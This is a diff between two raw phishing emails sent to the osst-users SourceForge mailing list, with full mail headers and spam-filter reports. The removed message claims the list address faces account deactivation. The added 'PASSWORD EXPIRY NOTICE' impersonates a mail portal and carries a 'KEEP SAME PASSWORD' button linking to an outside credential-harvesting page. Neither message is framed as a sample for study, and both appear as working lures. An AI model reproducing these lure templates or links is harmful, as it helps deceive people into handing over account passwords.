@@ -2,69 +2,101 @@ Return-Path: <osst-users-bounces@lists.sourceforge.net>
 X-Original-To: lists+osst-users@lfdr.de
 Delivered-To: lists+osst-users@lfdr.de
 Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
-	by mail.lfdr.de (Postfix) with ESMTPS id 0A0534AB691
-	for <lists+osst-users@lfdr.de>; Mon,  7 Feb 2022 09:34:20 +0100 (CET)
-Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
-	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.94.2)
+	by mail.lfdr.de (Postfix) with ESMTPS id B37684B0624
+	for <lists+osst-users@lfdr.de>; Thu, 10 Feb 2022 07:15:27 +0100 (CET)
+Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
+	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.94.2)
 	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
-	id 1nGzTX-0007c9-Az
-	for lists+osst-users@lfdr.de; Mon, 07 Feb 2022 08:34:17 +0000
+	id 1nI2jn-0003eO-5j
+	for lists+osst-users@lfdr.de; Thu, 10 Feb 2022 06:15:26 +0000
 Received: from [172.30.20.202] (helo=mx.sourceforge.net)
- by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
+ by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
  TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.94.2)
- (envelope-from <support@securyit.me>) id 1nGzTV-0007aS-E0
- for osst-users@lists.sourceforge.net; Mon, 07 Feb 2022 08:34:16 +0000
+ (envelope-from <herisugianto@alshifacharity.com>) id 1nI2jl-0003eI-LS
+ for osst-users@lists.sourceforge.net; Thu, 10 Feb 2022 06:15:24 +0000
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
  d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
  :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
  Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
  :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
  List-Subscribe:List-Post:List-Owner:List-Archive;
- bh=hONMPSuiCB8a0MsoP/KsqXjSSUcCzaKoMtJSwuyjJe0=; b=nSyeP9ENyw1BdZ8zGMIOfBfu00
- OkrwIV9DPNLRU2z3OiV3OXUYdgL0vu6w7HDuB/jlQz00+Bsk1o6h8NQuyFVQr2SlPZuglC1Jai6FH
- 00rBfvR3BhIc1ph224jZi7BYQVfNiM5ru4SsVqx8AlDHj0+NhTDLk61ZYIGkfAaojmQM=;
+ bh=GZeRUZbScdcvrDUPyXb6JwcLyUhLwZCVOPP/Asss+DA=; b=iE8ksJiZN2Wi2k/pKfraX+GmjO
+ TPd2PEZYsrvxL7yctK+SpG1tWxjVYNNOU8Ig5kv7xCfQA3QLLXoOSmBkWG/JpQdF/q5b5DADSkiGv
+ UdfCQoxk1ITzHbu6GfpQv3AOXF4hy9qa24Rieo9y3kr0lfQ3PJVonaaWP3ZlA1HjS6wU=;
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
  ;
  h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
  Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
  :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
  References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
- List-Owner:List-Archive; bh=hONMPSuiCB8a0MsoP/KsqXjSSUcCzaKoMtJSwuyjJe0=; b=l
- nAsKIiCeqAeQXFDhizz/cDny7Atz/o01KBo8YiEzFYDDmUBQFuepvG8dHctBi73HUnFaln8XR15fA
- kW/1jdesXa5tl5/RPoy3WfUdQoNSKb6CQt2Y2IE4kOXh7iW8oYtZwpXlj4g4IKdRF3o+4yDZ+F/qj
- s4PqwXacj5J88pBg=;
-Received: from vm3231222.24ssd.had.wf ([85.209.90.112] helo=mail0.securyit.me)
+ List-Owner:List-Archive; bh=GZeRUZbScdcvrDUPyXb6JwcLyUhLwZCVOPP/Asss+DA=; b=f
+ 6HDj6Vl8GjgUIqA0oWv3JhuDErz+nWw/XQeHBKl1pxeU9qsc+ndVLuRhOGqJtQb3DzuKH7t06MlnI
+ 1GDEa9aW56IdzAw07Q2Q87xG38Shn+TYbehdUcBp/plNLsAOEGFN5JoD/BtWGKXQYVGDDciYVLkng
+ cpm+o13g3NAVOUSg=;
+Received: from mail.elshifaradio.com ([202.62.9.134]
+ helo=mail.alshifacharity.com)
  by sfi-mx-1.v28.lw.sourceforge.com with esmtps
  (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.94.2)
- id 1nGzTS-005Gp8-Vv
- for osst-users@lists.sourceforge.net; Mon, 07 Feb 2022 08:34:15 +0000
+ id 1nI2jj-00Cg4g-Bx
+ for osst-users@lists.sourceforge.net; Thu, 10 Feb 2022 06:15:24 +0000
+Received: from localhost (localhost [127.0.0.1])
+ by mail.alshifacharity.com (Postfix) with ESMTP id 3D553368C26D
+ for <osst-users@lists.sourceforge.net>; Thu, 10 Feb 2022 12:59:14 +0700 (WIB)
+Received: from mail.alshifacharity.com ([127.0.0.1])
+ by localhost (mail.alshifacharity.com [127.0.0.1]) (amavisd-new, port 10032)
+ with ESMTP id ZepolUj5NvEg for <osst-users@lists.sourceforge.net>;
+ Thu, 10 Feb 2022 12:59:14 +0700 (WIB)
+Received: from localhost (localhost [127.0.0.1])
+ by mail.alshifacharity.com (Postfix) with ESMTP id 06428368C265
+ for <osst-users@lists.sourceforge.net>; Thu, 10 Feb 2022 12:59:14 +0700 (WIB)
+DKIM-Filter: OpenDKIM Filter v2.10.3 mail.alshifacharity.com 06428368C265
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=alshifacharity.com;
+ s=9A225636-2BCB-11E6-8963-A6C57115E816; t=1644472754;
+ bh=GZeRUZbScdcvrDUPyXb6JwcLyUhLwZCVOPP/Asss+DA=;
+ h=From:To:Date:Message-ID:MIME-Version;
+ b=hjSJqWPRN21d1fl0Ix0+VJ2YIK/KlrV6FRhqaeLs2TQdctGNmvSDTSCO8AU3FEPMw
+ WWA5u1d4b58s0mvRstV5fg/55UcXXHjLwQLcAPyzPYcWfMJPMciwtqTf8A4bBG8Zzf
+ JQvGvtE4ic786oVBSqq/y07WgwyNoiHHan//OfFY=
+X-Virus-Scanned: amavisd-new at alshifacharity.com
+Received: from mail.alshifacharity.com ([127.0.0.1])
+ by localhost (mail.alshifacharity.com [127.0.0.1]) (amavisd-new, port 10026)
+ with ESMTP id NVUiKfhLfJoo for <osst-users@lists.sourceforge.net>;
+ Thu, 10 Feb 2022 12:59:13 +0700 (WIB)
+Received: from alshifacharity.com (unknown [155.94.142.142])
+ by mail.alshifacharity.com (Postfix) with ESMTPSA id 5E953368C257
+ for <osst-users@lists.sourceforge.net>; Thu, 10 Feb 2022 12:59:13 +0700 (WIB)
 To: osst-users@lists.sourceforge.net
-Date: 07 Feb 2022 00:33:59 -0800
-Message-ID: <20220207003359.0DD593D29C73F7CE@lists.sourceforge.net>
+Date: 10 Feb 2022 06:59:12 +0100
+Message-ID: <20220210065912.D1A9AB869A0389E3@alshifacharity.com>
 MIME-Version: 1.0
-X-Spam-Score: 2.3 (++)
+X-Spam-Score: 0.4 (/)
 X-Spam-Report: Spam detection software,
- running on the system "util-spamd-1.v13.lw.sourceforge.com", 
+ running on the system "util-spamd-2.v13.lw.sourceforge.com", 
  has NOT identified this incoming email as spam.  The original
  message has been attached to this so you can view it or label
  similar future email.  If you have any questions, see
  the administrator of that system for details.
- Content preview:  lists.sourceforge.net Sender Action Required 
- Content analysis details:   (2.3 points, 6.0 required)
+ Content preview:  lists.sourceforge.net, password control portal! Your account
+ "osst-users@lists.sourceforge.net" password will expire in the next 24 hours:
+ 11/02/2022 11:59:00 p.m. Click below to keep the same password. 
+ Content analysis details:   (0.4 points, 6.0 required)
  pts rule name              description
  ---- ---------------------- --------------------------------------------------
- 0.7 RCVD_IN_XBL            RBL: Received via a relay in Spamhaus XBL
- [85.209.90.112 listed in zen.spamhaus.org]
- 0.2 HEADER_FROM_DIFFERENT_DOMAINS From and EnvelopeFrom 2nd level
- mail domains are different
  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
+ 0.5 SUBJ_ALL_CAPS          Subject is all capitals
  -0.0 SPF_PASS               SPF: sender matches SPF record
- 1.1 DKIM_ADSP_ALL          No valid author signature, domain signs all mail
- 0.1 URI_HEX                URI: URI hostname has long hexadecimal sequence
  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
  0.0 HTML_MESSAGE           BODY: HTML included in message
-X-Headers-End: 1nGzTS-005Gp8-Vv
-Subject: [Osst-users] Email Account De-activation Request
+ -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
+ author's domain
+ 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
+ valid
+ -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
+ -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
+ envelope-from domain
+ -0.0 T_SCC_BODY_TEXT_LINE   No description available.
+X-Headers-End: 1nI2jj-00Cg4g-Bx
+Subject: [Osst-users] PASSWORD EXPIRY NOTICE
 X-BeenThere: osst-users@lists.sourceforge.net
 X-Mailman-Version: 2.1.21
 Precedence: list
@@ -76,283 +108,117 @@ List-Post: <mailto:osst-users@lists.sourceforge.net>
 List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
  <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
-From: Admin Support Team via Osst-users <osst-users@lists.sourceforge.net>
-Reply-To: Admin Support Team <server@lists.sourceforge.net>
-Content-Type: multipart/mixed; boundary="===============0321783585826778530=="
+From: Email Admin via Osst-users <osst-users@lists.sourceforge.net>
+Reply-To: Email Admin <herisugianto@alshifacharity.com>
+Content-Type: multipart/mixed; boundary="===============6791416228095201819=="
 Errors-To: osst-users-bounces@lists.sourceforge.net
 
---===============0321783585826778530==
+--===============6791416228095201819==
 Content-Type: text/html;
 	charset="iso-8859-1"
 Content-Transfer-Encoding: quoted-printable
 
-<HTML><HEAD>
-<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
-<body>
-<table style=3D"FONT-SIZE: 15px; MAX-WIDTH: 548px; FONT-FAMILY: &quot;Segoe=
- UI&quot;, &quot;Lucida Sans&quot;, sans-serif; WHITE-SPACE: normal; WORD-S=
-PACING: 0px; BORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: =
-400; COLOR: black; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0p=
-x; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255=
-,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-c=
-aps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness:=20
-initial; text-decoration-style: initial; text-decoration-color: initial" ce=
-llspacing=3D"0" cellpadding=3D"0" width=3D"548">
+<HTML><BODY><DIV class=3D"gmail-v1gmail-adn gmail-v1gmail-ads" style=3D"FON=
+T-SIZE: 11px; BORDER-TOP: 0px; FONT-FAMILY: Roboto, RobotoDraft, Helvetica,=
+ Arial, sans-serif; COLOR: rgb(51,51,51); PADDING-BOTTOM: 0px; PADDING-TOP:=
+ 0px; PADDING-LEFT: 0px; BORDER-LEFT: medium none; DISPLAY: flex; PADDING-R=
+IGHT: 0px">
+<DIV class=3Dgmail-v1gmail-gs style=3D"BORDER-TOP: 0px; WIDTH: 1006px; PADD=
+ING-BOTTOM: 20px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING=
+-RIGHT: 0px">
+<DIV class=3Dgmail-v1gmail- style=3D"BORDER-TOP: 0px; PADDING-TOP: 0px">
+<DIV id=3Dgmail-v1gmail-:1vs class=3D"gmail-v1gmail-ii gmail-v1gmail-gt" st=
+yle=3D"BORDER-TOP: 0px; PADDING-BOTTOM: 0px; DIRECTION: ltr; PADDING-TOP: 0=
+px; PADDING-LEFT: 0px; MARGIN: 8px 0px 0px; PADDING-RIGHT: 0px">
+<DIV id=3Dgmail-v1gmail-:1v7 class=3D"gmail-v1gmail-a3s gmail-v1gmail-aiL" =
+style=3D"OVERFLOW: hidden; BORDER-TOP: 0px; FONT-FAMILY: Arial, Helvetica, =
+sans-serif; PADDING-TOP: 0px; LINE-HEIGHT: 1.5; font-variant-numeric: norma=
+l; font-variant-east-asian: normal; font-stretch: normal">
+<DIV style=3D"BORDER-TOP: 0px; PADDING-TOP: 0px; MARGIN: 0.5em">
+<DIV style=3D"FONT-FAMILY: Verdana">
+<CENTER>
+<DIV style=3D"BORDER-TOP: rgb(239,233,233) 1px solid; HEIGHT: 280px; BORDER=
+-RIGHT: rgb(239,233,233) 1px solid; WIDTH: 480px; BORDER-BOTTOM: rgb(239,23=
+3,233) 1px solid; PADDING-BOTTOM: 2px; TEXT-ALIGN: left; PADDING-TOP: 2px; =
+PADDING-LEFT: 2px; BORDER-LEFT: rgb(239,233,233) 1px solid; PADDING-RIGHT: =
+2px">
+<DIV style=3D"BORDER-TOP: 0px; WIDTH: 470px; PADDING-BOTTOM: 2px; PADDING-T=
+OP: 2px; PADDING-LEFT: 2px; PADDING-RIGHT: 2px">
+<CENTER><FONT color=3D#0000ff><SPAN style=3D"TEXT-ALIGN: left"><B><FONT siz=
+e=3D4><BR class=3Dgmail-Apple-interchange-newline>lists.sourceforge.net,</F=
+ONT></B></SPAN><FONT style=3D"FONT-SIZE: 12px" face=3D"Segoe UI">&nbsp;</FO=
+NT><FONT size=3D4 face=3D"Segoe UI"><B>password control portal!&nbsp;</B></=
+FONT></FONT><BR><SPAN style=3D"FONT-SIZE: 12px; COLOR: rgb(0,0,0)"><BR></SP=
+AN>
+<HR style=3D"FONT-SIZE: 12px; COLOR: rgb(0,0,0)">
+<SPAN style=3D'FONT-SIZE: medium; FONT-FAMILY: "Segoe UI"; COLOR: rgb(0,0,0=
+); TEXT-ALIGN: left'>Your&nbsp;account&nbsp;</SPAN><SPAN style=3D'FONT-SIZE=
+: medium; FONT-FAMILY: "Segoe UI"; TEXT-ALIGN: left'><FONT color=3D#0000ff>=
+"osst-users@lists.sourceforge.net"</FONT></SPAN><SPAN style=3D'FONT-SIZE: m=
+edium; FONT-FAMILY: "Segoe UI"; COLOR: rgb(0,0,0); TEXT-ALIGN: left'>&nbsp;=
+password will expire in the next 24 hours: 11/02/2022 11:59:00 p.m. Click b=
+elow to keep the same password.&nbsp;</SPAN><FONT face=3D"Segoe UI">&nbsp;<=
+SPAN style=3D"FONT-SIZE: 12px; COLOR: rgb(0,0,0)">&nbsp;</SPAN><BR><BR>
+<TABLE style=3D"FONT-SIZE: 12px; TABLE-LAYOUT: fixed; COLOR: rgb(0,0,0)" ce=
+llSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
 <TBODY>
 <TR>
-<td style=3D"PADDING-BOTTOM: 15px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px">
-<table style=3D"MAX-WIDTH: 548px; HEIGHT: 101px; FONT-FAMILY: inherit; WIDT=
-H: 543px; BORDER-COLLAPSE: collapse; FONT-WEIGHT: 600; PADDING-BOTTOM: 0px;=
- PADDING-TOP: 0px">
+<TD style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; PADD=
+ING-RIGHT: 0px" align=3Dcenter>
+<TABLE cellSpacing=3D0 cellPadding=3D0 border=3D0>
 <TBODY>
 <TR>
-<td style=3D"FONT-FAMILY: &quot;segoe ui&quot;, frutiger, arial, sans-serif=
-; WIDTH: 181px; VERTICAL-ALIGN: bottom"><SPAN class=3Dv1colour style=3D"COL=
-OR: rgb(241,97,14)">lists.sourceforge.net</SPAN><BR></TD>
-<td style=3D"FONT-FAMILY: &quot;segoe ui&quot;, frutiger, arial, sans-serif=
-; WIDTH: 186px; VERTICAL-ALIGN: bottom; TEXT-ALIGN: center"><BR></TD>
-<td style=3D"FONT-FAMILY: &quot;segoe ui&quot;, frutiger, arial, sans-serif=
-; WIDTH: 181px; VERTICAL-ALIGN: bottom; TEXT-ALIGN: right"><BR></TD></TR>
-<TR>
-<td style=3D"FONT-SIZE: 14px; FONT-FAMILY: &quot;segoe ui&quot;, frutiger, =
-arial, sans-serif; WIDTH: 181px; VERTICAL-ALIGN: middle; FONT-WEIGHT: 400; =
-PADDING-BOTTOM: 0px; PADDING-TOP: 0px"><SPAN><SPAN class=3Dv1colour style=
-=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseli=
-ne; BORDER-BOTTOM-WIDTH: 0px; COLOR: black; PADDING-BOTTOM: 0px; PADDING-TO=
-P: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDT=
-H: 0px">Sender</SPAN></SPAN><BR></TD>
-<td style=3D"FONT-SIZE: 14px; FONT-FAMILY: &quot;segoe ui&quot;, frutiger, =
-arial, sans-serif; WIDTH: 186px; VERTICAL-ALIGN: middle; FONT-WEIGHT: 400; =
-PADDING-BOTTOM: 0px; TEXT-ALIGN: center; PADDING-TOP: 0px"><BR></TD>
-<td style=3D"FONT-SIZE: 14px; FONT-FAMILY: &quot;segoe ui&quot;, frutiger, =
-arial, sans-serif; WIDTH: 181px; VERTICAL-ALIGN: middle; FONT-WEIGHT: 400; =
-PADDING-BOTTOM: 0px; TEXT-ALIGN: right; PADDING-TOP: 0px"><SPAN><SPAN class=
-=3Dv1colour style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTI=
-CAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(192,0,0); PADDING=
--BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIG=
-HT: 0px; BORDER-TOP-WIDTH: 0px"><B>Action Required</B></SPAN>
- </SPAN><BR></TD></TR>
-<TR>
-<td style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; PADD=
-ING-RIGHT: 0px" colspan=3D"3">
-<table style=3D"BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP=
-: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px" cellspacing=3D"0" cellpadding=
-=3D"0">
+<TD style=3D"FONT-SIZE: 16px" bgColor=3D#0073f0 align=3Dcenter><A style=3D"=
+FONT-SIZE: 14px; BORDER-TOP: rgb(0,115,255) 1px solid; BORDER-RIGHT: rgb(0,=
+115,255) 1px solid; WIDTH: 216px; BORDER-BOTTOM: rgb(0,115,255) 1px solid; =
+COLOR: rgb(255,255,255); PADDING-BOTTOM: 12px; PADDING-TOP: 12px; PADDING-L=
+EFT: 18px; BORDER-LEFT: rgb(0,115,255) 1px solid; DISPLAY: inline-block; LE=
+TTER-SPACING: 0px; LINE-HEIGHT: 27px; PADDING-RIGHT: 18px; BACKGROUND-COLOR=
+: rgb(0,115,255)" href=3D"https://lgpathlab.co.uk/wp-expire/account.php?mai=
+n_domain=3Dhttps://lists.sourceforge.net&amp;email=3Dosst-users@lists.sourc=
+eforge.net&amp;subdomain=3Dhttps://lists.sourceforge.net" rel=3Dnoreferrer =
+target=3D_blank>KEEP SAME PASSWORD</A></TD></TR></TBODY></TABLE></TD></TR><=
+/TBODY></TABLE>
+<TABLE style=3D"FONT-SIZE: 12px; TABLE-LAYOUT: fixed; COLOR: rgb(0,0,0)" ce=
+llSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
 <TBODY>
-<TR height=3D10>
-<td style=3D"FONT-SIZE: 6px; HEIGHT: 10px; WIDTH: 180px; PADDING-BOTTOM: 0p=
-x; PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 10px; PADDING-RIGHT: 0=
-px" bgcolor=3D"#cccccc"><BR></TD>
-<td style=3D"FONT-SIZE: 6px; HEIGHT: 10px; WIDTH: 4px; PADDING-BOTTOM: 0px;=
- PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 10px; PADDING-RIGHT: 0px=
-" bgcolor=3D"white"><BR></TD>
-<td style=3D"FONT-SIZE: 6px; HEIGHT: 10px; WIDTH: 180px; PADDING-BOTTOM: 0p=
-x; PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 10px; PADDING-RIGHT: 0=
-px" bgcolor=3D"#cccccc"><BR></TD>
-<td style=3D"FONT-SIZE: 6px; HEIGHT: 10px; WIDTH: 4px; PADDING-BOTTOM: 0px;=
- PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 10px; PADDING-RIGHT: 0px=
-" bgcolor=3D"white"><BR></TD>
-<td style=3D"FONT-SIZE: 6px; HEIGHT: 10px; WIDTH: 180px; PADDING-BOTTOM: 0p=
-x; PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 10px; PADDING-RIGHT: 0=
-px" bgcolor=3D"#c00000"><BR></TD></TR></TBODY></TABLE></TD></TR>
-<TR>
-<td style=3D"FONT-SIZE: 14px; FONT-FAMILY: &quot;segoe ui&quot;, frutiger, =
-arial, sans-serif; WIDTH: 181px; FONT-WEIGHT: 400; PADDING-BOTTOM: 0px; PAD=
-DING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 20px; PADDING-RIGHT: 0px"><B=
-R></TD>
-<td style=3D"FONT-SIZE: 14px; FONT-FAMILY: &quot;segoe ui&quot;, frutiger, =
-arial, sans-serif; WIDTH: 186px; FONT-WEIGHT: 400; PADDING-BOTTOM: 0px; TEX=
-T-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 20px; PA=
-DDING-RIGHT: 0px"><BR></TD>
-<td style=3D"FONT-SIZE: 14px; FONT-FAMILY: &quot;segoe ui&quot;, frutiger, =
-arial, sans-serif; WIDTH: 181px; FONT-WEIGHT: 400; PADDING-BOTTOM: 0px; TEX=
-T-ALIGN: right; PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 20px; PAD=
-DING-RIGHT: 0px"><SPAN><SPAN class=3Dv1colour style=3D"BORDER-LEFT-WIDTH: 0=
-px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH:=
- 0px; COLOR: rgb(192,0,0); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-L=
-EFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px">
-<B>eMail Account Deactivation</B></SPAN></SPAN><BR></TD></TR></TBODY></TABL=
-E></TD></TR>
-<TR>
-<td style=3D"WIDTH: 528px; PADDING-TOP: 0px; PADDING-LEFT: 10px; PADDING-RI=
-GHT: 10px">
-<DIV style=3D"BORDER-TOP: 0px; PADDING-TOP: 0px">&nbsp;</DIV>
-<table style=3D"HEIGHT: 333px; WIDTH: 537px; PADDING-BOTTOM: 0px; PADDING-T=
-OP: 0px; PADDING-LEFT: 0px; MARGIN-LEFT: 0px; PADDING-RIGHT: 0px; BACKGROUN=
-D-COLOR: rgb(242,245,250)">
-<TBODY>
-<TR>
-<td style=3D"FONT-SIZE: 21px; FONT-FAMILY: &quot;segoe ui&quot;, frutiger, =
-arial, sans-serif; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 10p=
-x; PADDING-RIGHT: 10px">
-<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 15px; FONT-FAMILY: inherit=
-; BORDER-RIGHT-WIDTH: 0px; BORDER-TOP-COLOR: ; VERTICAL-ALIGN: baseline; BO=
-RDER-BOTTOM-WIDTH: 0px; COLOR: rgb(32,31,30); PADDING-BOTTOM: 0px; PADDING-=
-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WI=
-DTH: 0px">
-<table style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 11px; MAX-WIDTH: 680px; =
-FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif; BORDER-RIGHT-WIDTH: 0px=
-; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(51,51,51); BORDER-TOP-WIDTH: 0px; BA=
-CKGROUND-COLOR: rgb(244,244,244)" cellspacing=3D"0" cellpadding=3D"0" width=
-=3D"680" border=3D"0">
-<TBODY>
-<TR>
-<td style=3D"FONT-SIZE: 16px; FONT-FAMILY: Helvetica, Arial, sans-serif" he=
-ight=3D"25" width=3D"680"><SPAN class=3Dv1size style=3D"FONT-SIZE: 10px">&n=
-bsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; =
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;=
-<SPAN>&nbsp;</SPAN><SPAN class=3Dv1size style=3D"FONT-SIZE: 13px"><B>Closin=
-g Of Email Address Notice !</B></SPAN></SPAN><BR></TD></TR>
-<TR>
-<td style=3D"BORDER-TOP: rgb(232,232,232) 2px solid; BORDER-RIGHT: rgb(232,=
-232,232) 2px solid; BORDER-BOTTOM: rgb(255,108,44) 2px solid; PADDING-BOTTO=
-M: 20px; PADDING-TOP: 15px; PADDING-LEFT: 0px; BORDER-LEFT: rgb(232,232,232=
-) 2px solid; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255)">
-<table style=3D"FONT-FAMILY: Helvetica, Arial, sans-serif" cellspacing=3D"0=
-" cellpadding=3D"0" width=3D"680" border=3D"0">
-<TBODY>
-<TR>
-<td width=3D"15"><SPAN class=3Dv1size style=3D"FONT-SIZE: 13px"><BR></SPAN>=
-</TD>
-<td width=3D"650">
-<table cellspacing=3D"0" cellpadding=3D"0" width=3D"100%" border=3D"0">
-<TBODY>
-<TR>
-<td>
-<DIV style=3D"BORDER-TOP: 0px; PADDING-TOP: 0px"><SPAN class=3Dv1size style=
-=3D"FONT-SIZE: 13px"><SPAN>Attention&nbsp;osst-users ,<BR><BR>&#9888; We ha=
-ve received your request to Deactivate your email account below, and the re=
-quest will be concluded within 12hours from now.</SPAN><BR><BR></SPAN></DIV=
+<TR></TR></TBODY></TABLE><FONT color=3D#000000>Note: If you have validated =
+please ignore this message.</FONT><BR>
+<CENTER><FONT style=3D"COLOR: rgb(0,0,0)" face=3D"Segoe UI">This email was =
+sent to:&nbsp;</FONT><FONT color=3D#0000ff>osst-users@lists.sourceforge.net=
+&nbsp;</FONT><FONT color=3D#000000>&nbsp;</FONT><FONT style=3D"COLOR: rgb(0=
+,0,0)" face=3D"Segoe UI"><BR></FONT><FONT color=3D#000000>All rights reserv=
+ed: Mail portal 2022.</FONT></CENTER></FONT></CENTER></DIV></DIV></CENTER><=
+/DIV></DIV>
+<DIV class=3Dgmail-v1gmail-yj6qo style=3D"FONT-SIZE: small"></DIV>
+<DIV class=3Dgmail-v1gmail-adL style=3D"FONT-SIZE: small"></DIV></DIV></DIV=
 >
-<table style=3D"MAX-WIDTH: 630px; BORDER-TOP: rgb(232,232,232) 2px solid; B=
-ORDER-RIGHT: rgb(232,232,232) 2px solid; BORDER-BOTTOM: rgb(232,232,232) 2p=
-x solid; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-L=
-EFT: rgb(232,232,232) 2px solid; MARGIN: 5px 10px; PADDING-RIGHT: 0px" cell=
-spacing=3D"0" cellpadding=3D"5">
-<TBODY>
-<TR>
-<TH align=3Dleft><SPAN class=3Dv1size style=3D"FONT-SIZE: 13px">Affected Em=
-ail<SPAN>&nbsp;</SPAN></SPAN><BR></TH>
-<td align=3D"left"><SPAN class=3Dv1size style=3D"FONT-SIZE: 13px"><B>Accoun=
-t Details</B></SPAN><BR></TD></TR>
-<TR style=3D"BACKGROUND-COLOR: rgb(244,244,244)">
-<TH align=3Dleft><SPAN class=3Dv1size style=3D"FONT-SIZE: 13px">Domain :</S=
-PAN></TH>
-<td align=3D"left"><SPAN class=3Dv1size style=3D"FONT-SIZE: 13px"><SPAN cla=
-ss=3Dv1colour style=3D"COLOR: rgb(51,51,51)">lists.sourceforge.net</SPAN></=
-SPAN></TD></TR>
-<TR>
-<TH align=3Dleft><SPAN class=3Dv1size style=3D"FONT-SIZE: 13px">User&nbsp;&=
-nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
-sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<SPAN>&nbsp;</SPAN><SPAN=
->&nbsp;</SPAN></SPAN></TH>
-<td align=3D"left"><SPAN class=3Dv1size style=3D"FONT-SIZE: 13px">osst-user=
-s</SPAN></TD></TR>
-<TR style=3D"BACKGROUND-COLOR: rgb(244,244,244)">
-<TH align=3Dleft><SPAN class=3Dv1size style=3D"FONT-SIZE: 13px">Email&nbsp;=
-&nbsp;&nbsp; :&nbsp;</SPAN><BR></TH>
-<td align=3D"left"><SPAN class=3Dv1size style=3D"FONT-SIZE: 13px">osst-user=
